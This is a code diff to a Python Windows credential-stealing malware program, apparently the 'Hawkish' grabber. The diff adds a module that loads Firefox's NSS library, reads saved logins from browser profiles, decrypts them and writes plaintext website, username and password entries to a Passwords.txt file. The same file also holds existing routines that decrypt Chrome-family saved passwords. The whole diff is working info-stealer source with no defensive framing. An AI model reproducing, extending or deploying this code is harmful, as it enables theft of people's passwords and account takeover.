@@ -25,6 +25,10 @@ import win32process
 import cv2
 
 
+from urllib.parse import urlparse
+from configparser import ConfigParser
+
+
 
 from tempfile import gettempdir, mkdtemp
 from sqlite3 import connect
@@ -32,10 +36,10 @@ from base64 import b64decode
 from urllib.request import Request, urlopen
 from datetime import datetime, timedelta, timezone
 from sys import argv
-from ctypes import windll, wintypes, byref, cdll, Structure, POINTER, c_char, c_buffer
+from ctypes import windll, wintypes, byref, cdll, Structure, POINTER, c_char, c_buffer, c_char_p, c_int, c_uint32, c_void_p, c_uint
 from Crypto.Cipher import AES
 from win32crypt import CryptUnprotectData
-from subprocess import CREATE_NEW_CONSOLE, Popen
+from subprocess import CREATE_NEW_CONSOLE, Popen, PIPE
 from PIL import ImageGrab
 
 
@@ -328,8 +332,161 @@ class Replacer_Loop(Functions):
             self.loop_through()
 
 
+
+
+
+
+class NotFoundError(Exception):
+    pass
+
+
+class Credentials(object):
+    def __init__(self, db):
+        self.db = db
+        if not os.path.isfile(db):
+            raise NotFoundError("ERROR - {0} database not found\n".format(db))
+    def __iter__(self):
+        pass
+    def done(self):
+        pass
+
+
+class SqliteCredentials(Credentials):
+    def __init__(self, profile):
+        db = os.path.join(profile, "signons.sqlite")
+        super(SqliteCredentials, self).__init__(db)
+        self.conn = sqlite3.connect(db)
+        self.c = self.conn.cursor()
+
+    def __iter__(self):
+        self.c.execute("SELECT hostname, encryptedUsername, encryptedPassword, encType "
+                       "FROM moz_logins")
+        for i in self.c:
+            yield i
+
+    def done(self):
+        super(SqliteCredentials, self).done()
+        self.c.close()
+        self.conn.close()
+
+
+class JsonCredentials(Credentials):
+    def __init__(self, profile):
+        db = os.path.join(profile, "logins.json")
+        super(JsonCredentials, self).__init__(db)
+
+    def __iter__(self):
+        with open(self.db) as fh:
+            data = json.load(fh)
+            try:
+                logins = data["logins"]
+            except:
+                raise Exception("Unrecognized format in {0}".format(self.db))
+            for i in logins:
+                yield (i["hostname"], i["encryptedUsername"],
+                       i["encryptedPassword"], i["encType"])
+
+
+class NSSDecoder(object):
+    class SECItem(ctypes.Structure):
+        _fields_ = [
+            ('type', c_uint),
+            ('data', c_char_p),
+            ('len', c_uint),
+        ]
+
+    class PK11SlotInfo(ctypes.Structure):
+        ...
+
+    def __init__(self):
+        self.NSS = None
+        self.load_libnss()
+        SlotInfoPtr = ctypes.POINTER(self.PK11SlotInfo)
+        SECItemPtr = ctypes.POINTER(self.SECItem)
+        self._set_ctypes(c_int, "NSS_Init", c_char_p)
+        self._set_ctypes(c_int, "NSS_Shutdown")
+        self._set_ctypes(SlotInfoPtr, "PK11_GetInternalKeySlot")
+        self._set_ctypes(None, "PK11_FreeSlot", SlotInfoPtr)
+        self._set_ctypes(c_int, "PK11_CheckUserPassword", SlotInfoPtr, c_char_p)
+        self._set_ctypes(c_int, "PK11SDR_Decrypt", SECItemPtr, SECItemPtr, c_void_p)
+        self._set_ctypes(None, "SECITEM_ZfreeItem", SECItemPtr, c_int)
+        self._set_ctypes(c_int, "PORT_GetError")
+        self._set_ctypes(c_char_p, "PR_ErrorToName", c_int)
+        self._set_ctypes(c_char_p, "PR_ErrorToString", c_int, c_uint32)
+
+    def _set_ctypes(self, restype, name, *argtypes):
+        res = getattr(self.NSS, name)
+        res.restype = restype
+        res.argtypes = argtypes
+        setattr(self, "_" + name, res)
+
+    @staticmethod
+    def find_nss(locations, nssname):
+        for loc in locations:
+            if os.path.exists(os.path.join(loc, nssname)):
+                return loc
+        return ""
+
+    def load_libnss(self):
+        if os.name == "nt":
+            nssname = "nss3.dll"
+            locations = (
+                "", 
+                r"C:\Program Files (x86)\Mozilla Firefox",
+                r"C:\Program Files\Mozilla Firefox"
+            )
+            firefox = self.find_nss(locations, nssname)
+            os.environ["PATH"] = ';'.join([os.environ["PATH"], firefox])
+        elif os.uname()[0] == "Darwin":
+            nssname = "libnss3.dylib"
+            locations = (
+                "",  
+                "/usr/local/lib/nss",
+                "/usr/local/lib",
+                "/opt/local/lib/nss",
+                "/sw/lib/firefox",
+                "/sw/lib/mozilla",
+                "/usr/local/opt/nss/lib", 
+                "/opt/pkg/lib/nss",
+            )
+            firefox = self.find_nss(locations, nssname)
+        else:
+            nssname = "libnss3.so"
+            firefox = ""
+        try:
+            nsslib = os.path.join(firefox, nssname)
+            self.NSS = ctypes.CDLL(nsslib)
+        except Exception as e:
+            pass
+
+    def handle_error(self):
+        code = self._PORT_GetError()
+        name = self._PR_ErrorToName(code)
+        name = "NULL" if name is None else name.decode("ascii")
+        text = self._PR_ErrorToString(code, 0)
+        text = text.decode("utf8")
+
+    def decode(self, data64):
+        data = b64decode(data64)
+        inp = self.SECItem(0, data, len(data))
+        out = self.SECItem(0, None, 0)
+        e = self._PK11SDR_Decrypt(inp, out, None)
+        try:
+            if e == -1:
+                pass
+            res = ctypes.string_at(out.data, out.len).decode("utf8")
+        finally:
+            self._SECITEM_ZfreeItem(out, 0)
+        return res
+
+
+
+
 class hwkish_first_funct(Functions):
     def __init__(self):
+        
+        self.profile = None
+        self.NSS = NSSDecoder()
 
         self.eco_baby = f'{base64.b64decode(self.find_in_config("hooking_hawk"))}'.replace("b'", "").replace("'", "")
         self.ecobybro = str(self.eco_baby)
@@ -533,7 +690,7 @@ class hwkish_first_funct(Functions):
             }
 
         self.path_shortcutnav_roaming = {
-            "Google Chrome": f"{self.roaming}\\Microsoft\\Windows\\Start Menu\\Programs\\Google Chrome.lnk",
+            "Google Chrome": f"{self.roaming}\\Microsoft\\Windows\\Start Menu\\Programs\\Google Chrome.lnk",
             "Opera": f"{self.roaming}\\Microsoft\\Windows\\Start Menu\\Programs\\Opera.lnk",
             "Opera GX": f"{self.roaming}\\Microsoft\\Windows\\Start Menu\\Programs\\Opera GX.lnk",
             "Brave": f"{self.roaming}\\Microsoft\\Windows\\Start Menu\\Programs\\Brave.lnk",
@@ -548,7 +705,7 @@ class hwkish_first_funct(Functions):
             "Opera Neon": f"{self.roaming}\\Microsoft\\Windows\\Start Menu\\Programs\\Opera Neon.lnk"
         }
         self.path_shortcutnav_programdata = {
-            "Google Chrome": f"{self.programdata}\\Microsoft\\Windows\\Start Menu\\Programs\\Google Chrome.lnk",
+            "Google Chrome": f"{self.programdata}\\Microsoft\\Windows\\Start Menu\\Programs\\Google Chrome.lnk",
             "Opera": f"{self.programdata}\\Microsoft\\Windows\\Start Menu\\Programs\\Opera.lnk",
             "Opera GX": f"{self.programdata}\\Microsoft\\Windows\\Start Menu\\Programs\\Opera GX.lnk",
             "Brave": f"{self.programdata}\\Microsoft\\Windows\\Start Menu\\Programs\\Brave.lnk",
@@ -874,6 +1031,11 @@ class hwkish_first_funct(Functions):
                 self.hwkishsteal_cc2,
             ]
 
+            try:
+                t = threading.Thread(target=self.firefox())
+                t.start()
+            except:
+                pass
             for profile in self.profiles:
                 for func in self.funcs:
                     try:
@@ -1478,6 +1640,187 @@ class hwkish_first_funct(Functions):
         path = os.path.join(_dir, filname)
         open(path, "x")
         return path
+    
+    def test_firefox_psw(self, export):
+        if not export:
+            return
+        try:
+            p = Popen(["pass"], stdout=PIPE, stderr=PIPE)
+        except OSError as e:
+            if e.errno == 2:
+                pass
+            else:
+                pass
+        out, err = p.communicate()
+        if p.returncode != 0:
+            if 'Try "pass init"' in err:
+                pass
+            else:
+                pass
+
+    def export_pass(self, to_export, prefix):
+        for address in to_export:
+            for user, passw in to_export[address].items():
+                if len(to_export[address]) > 1:
+                    passname = u"{0}/{1}/{2}".format(prefix, address, user)
+                else:
+                    passname = u"{0}/{1}".format(prefix, address)
+                data = u"{0}\n{1}\n".format(passw, user)
+                cmd = ["pass", "insert", "--force", "--multiline", passname]
+                p = Popen(cmd, stdout=PIPE, stderr=PIPE, stdin=PIPE)
+                out, err = p.communicate(data.encode("utf8"))
+                if p.returncode != 0:
+                    pass
+
+
+    def get_sections(self, profiles):
+        sections = {}
+        i = 1
+        for section in profiles.sections():
+            if section.startswith("Profile"):
+                sections[str(i)] = profiles.get(section, "Path")
+                i += 1
+            else:
+                continue
+        return sections
+
+
+    def read_profiles(self, basepath, list_profiles):
+        profileini = os.path.join(basepath, "profiles.ini")
+        if not os.path.isfile(profileini):
+            pass
+        profiles = ConfigParser()
+        profiles.read(profileini)
+        return profiles
+
+
+    def get_profile(self, basepath, interactive=False, choice=None, list_profiles=False):
+        try:
+            profiles = self.read_profiles(basepath, list_profiles)
+        except Exception as e:
+            pass
+        else:
+            sections = self.get_sections(profiles)
+            if not interactive and choice:
+                selected_sections = [sections[c] for c in choice if c in sections]
+            else:
+                selected_sections = list(sections.values())
+            profiles = [os.path.join(basepath, section) for section in selected_sections]
+            for profile in profiles:
+                if not os.path.isdir(profile):
+                    pass
+        return profiles
+
+
+
+    def parse_sys_args(self):
+        if os.name == "nt":
+            profile_path = os.path.join(os.environ['APPDATA'], "Mozilla", "Firefox")
+        elif os.uname()[0] == "Darwin":
+            profile_path = "~/Library/Application Support/Firefox"
+        else:
+            profile_path = "~/.mozilla/firefox"
+        args = {
+            'profile': profile_path,
+            'export_pass': False,
+            'pass_prefix': u"web",
+            'format': "human",
+            'delimiter': ";",
+            'quotechar': '"',
+            'interactive': True,
+            'choice': None,
+            'list': False,
+            'verbose': 0
+        }
+        args['delimiter'] = ";" if args['delimiter'] != "\\t" else "\t"
+        return args
+    
+    def load_profile(self, profile):
+        self.profile = profile
+        e = self.NSS._NSS_Init(b"sql:" + self.profile.encode("utf8"))
+        if e != 0:
+            pass
+
+    def authenticate(self, interactive):
+        keyslot = self.NSS._PK11_GetInternalKeySlot()
+        if not keyslot:
+            self.NSS.handle_error()
+            pass
+        self.NSS._PK11_FreeSlot(keyslot)
+
+    def unload_profile(self):
+        e = self.NSS._NSS_Shutdown()
+        if e != 0:
+            pass
+
+    def decode_entry(self, user64, passw64):
+        user = self.NSS.decode(user64)
+        passw = self.NSS.decode(passw64)
+        return user, passw
+    
+    def obtain_credentials(self, profile):
+        try:
+            credentials = JsonCredentials(profile)
+        except NotFoundError:
+            try:
+                credentials = SqliteCredentials(profile)
+            except NotFoundError:
+                pass
+        return credentials
+
+    def decrypt_passwords(self, export):
+        def output_line(line, file):
+            file.write(line)
+
+        got_password = False
+        credentials = self.obtain_credentials(self.profile)
+        to_export = {}
+        os.makedirs(os.path.join(self.dir, "Firefox"), exist_ok=True)
+        with open(os.path.join(self.dir, "Firefox", f"Passwords.txt"), "w", encoding="utf-8") as output_file:
+            for url, user, passw, enctype in credentials:
+                got_password = True
+                if enctype:
+                    user, passw = self.decode_entry(user, passw)
+                if export:
+                    address = urlparse(url)
+                    if address.netloc not in to_export:
+                        to_export[address.netloc] = {user: passw}
+                    else:
+                        to_export[address.netloc][user] = passw
+                else:
+                    output = (
+                        u"\nWebsite: {0}\n".format(url),
+                        u"ID: {0}\n".format(user),
+                        u"Password: {0}\n".format(passw),
+                    )
+                    for line in output:
+                        output_line(line, output_file)
+        credentials.done()
+        if not got_password:
+            pass
+        if export:
+            return to_export
+
+
+    def firefox(self):
+        args = self.parse_sys_args()
+        self.test_firefox_psw(args["export_pass"])
+        
+        basepath = os.path.expanduser(args['profile'])
+        profiles = self.get_profile(basepath, args['interactive'], args['choice'], args['list'])
+        for profile in profiles:
+            try:
+                self.load_profile(profile)
+                self.authenticate(args['interactive'])
+                to_export = self.decrypt_passwords(
+                    export=args['export_pass'],
+                )
+                if args['export_pass']:
+                    self.export_pass(to_export, args['pass_prefix'])
+                self.unload_profile()
+            except Exception as e:
+                pass
+
 
     @extract_try
     def hwkishsteal_psw2(self, name: str, path: str, profile: str):
@@ -1493,12 +1836,12 @@ class hwkish_first_funct(Functions):
             shutil.copy2(path, loginvault)
             conn = sqlite3.connect(loginvault)
             cursor = conn.cursor()
-            with open(os.path.join(self.dir, "Browsers", "Password.txt"), "a", encoding="utf-8") as f:
+            with open(os.path.join(self.dir, "Browsers", "Passwords.txt"), "a", encoding="utf-8") as f:
                 for url, username, password in cursor.execute("SELECT origin_url, username_value, password_value FROM logins"):
                     if url:
                         password = self.value_decrypt(password, self.masterkey)
                         f.write(
-                            f"LINK: {url}\nIDENT:{username}\n{hwkish}-{stspecial}  PASSW:{password}\n\n")
+                            f"Website: {url}\nID: {username}\nPassword: {password}\n\n")
                         self.thingstocount['passwrd'] += len(password)
             cursor.close()
         finally:
@@ -1547,11 +1890,11 @@ class hwkish_first_funct(Functions):
                                 encrypted_password, self.chrome_key)
                             if url:
                                 f.write(
-                                    f"LINK: {url}\nIDENT:{username}\n{hwkish}-{stspecial}  PASSW:{decrypted_password}\n\n")
+                                    f"Website: {url}\nID: {username}\nPassword: {decrypted_password}\n\n")
                                 self.thingstocount['passwrd'] += len(
                                     decrypted_password)
                     os.remove(login)
-
+    
     @extract_try
     def hwkishstol_gang(self):
         if self.hwk_get_browsers != "yes":
